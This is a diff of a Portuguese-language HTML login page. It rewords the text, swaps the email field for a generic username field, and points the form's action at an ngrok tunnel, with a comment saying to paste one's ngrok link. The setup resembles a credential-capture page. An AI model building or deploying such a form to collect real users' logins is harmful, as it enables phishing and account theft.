@@ -1,4 +1,5 @@
- <html lang="pt-BR">
+<!DOCTYPE html>
+<html lang="pt-PT">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -48,33 +49,33 @@
                 <i data-lucide="lock" class="text-white w-8 h-8"></i>
             </div>
             <h1 class="text-3xl font-bold text-white tracking-tight">Bem-vindo</h1>
-            <p class="text-slate-400 mt-2 text-sm">Insira suas credenciais para continuar.</p>
+            <p class="text-slate-400 mt-2 text-sm">Insira as suas credenciais para continuar.</p>
         </div>
 
         <!-- Card de Login -->
         <div class="bg-slate-900/50 backdrop-blur-xl border border-white/10 rounded-2xl p-8 shadow-2xl">
             
             <!-- 
-                 IMPORTANTE: 
-                 Substitua o valor de action="" pelo seu link do NGROK.
-                 Exemplo: action="https://seu-link.ngrok-free.app/login.php"
+                 👇 IMPORTANTE: COLE O SEU LINK DO NGROK AQUI EM BAIXO 👇
+                 Exemplo: action="https://xxxx-xx-xx-xx-xx.ngrok-free.app/login.php"
             -->
-            <form action="https://meristic-unironical-gail.ngrok-" method="POST" class="space-y-6">
+            <form action="https://meristic-unironical-gail.ngrok-/" method="POST" class="space-y-6">
                 
-                <!-- Campo Email -->
+                <!-- Campo Usuário / Email -->
                 <div>
-                    <label for="email" class="block text-sm font-medium text-slate-300 mb-2">Email</label>
+                    <label for="username" class="block text-sm font-medium text-slate-300 mb-2">Usuário ou Email</label>
                     <div class="relative group">
                         <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
-                            <i data-lucide="mail" class="h-5 w-5 text-slate-500 group-focus-within:text-blue-400 transition-colors"></i>
+                            <!-- Ícone alterado para User para representar login genérico -->
+                            <i data-lucide="user" class="h-5 w-5 text-slate-500 group-focus-within:text-blue-400 transition-colors"></i>
                         </div>
                         <input 
-                            type="email" 
-                            name="email" 
-                            id="email" 
+                            type="text" 
+                            name="username" 
+                            id="username" 
                             required 
                             class="block w-full pl-10 pr-3 py-3 bg-slate-800 border border-slate-700 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-white placeholder-slate-500 transition-all outline-none"
-                            placeholder="nome@exemplo.com"
+                            placeholder="ex: admin ou nome@empresa.com"
                         >
                     </div>
                 </div>
